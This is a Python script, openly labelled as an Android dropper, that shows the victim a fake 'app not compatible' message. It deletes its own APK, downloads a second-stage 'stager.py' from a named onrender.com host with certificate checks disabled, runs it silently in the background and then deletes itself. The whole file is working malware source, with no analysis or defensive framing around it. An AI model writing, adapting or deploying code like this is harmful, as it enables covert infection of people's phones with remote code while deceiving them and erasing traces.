# ============================================
# DROPPER.PY - ANDROID DROPPER APK
# Downloads and runs the real malware
# ============================================

import requests
import os
import sys
import time
import subprocess
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

base_url = "https://newmethod-ish6.onrender.com"

# ============================================
# 1. FAKE POPUP: "App Not Compatible"
# ============================================
def show_fake_error():
    print("This app is not compatible with your device.")
    print("It will be removed automatically.")

# ============================================
# 2. DELETE APK FILE (After Install)
# ============================================
def delete_apk():
    try:
        apk_path = "/storage/emulated/0/Download/dropper.apk"
        if os.path.exists(apk_path):
            os.remove(apk_path)
            print("APK deleted.")
    except Exception as e:
        print("APK delete error:", e)

# ============================================
# 3. DOWNLOAD THE REAL MALWARE
# ============================================
def download_malware():
    url = base_url + "/stager.py"
    download_path = "/storage/emulated/0/Download/stager.py"

    try:
        response = requests.get(url, verify=False)
        if response.status_code == 200:
            with open(download_path, 'wb') as f:
                f.write(response.content)
            print("Malware downloaded successfully.")
            return download_path
        else:
            print("Download failed:", response.status_code)
            return None
    except Exception as e:
        print("Download error:", e)
        return None

# ============================================
# 4. RUN THE MALWARE
# ============================================
def run_malware(filepath):
    try:
        subprocess.Popen(["python", filepath], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("Malware running in background.")
    except Exception as e:
        print("Failed to run malware:", e)

# ============================================
# 5. SELF-DELETE (Dropper APK)
# ============================================
def self_delete():
    try:
        os.remove(__file__)
        print("Dropper deleted.")
    except Exception as e:
        print("Self-delete failed:", e)

# ============================================
# 6. MAIN EXECUTION
# ============================================
def main():
    show_fake_error()
    delete_apk()
    malware_path = download_malware()
    if malware_path:
        run_malware(malware_path)
    self_delete()
    sys.exit()

if __name__ == "__main__":
    main()
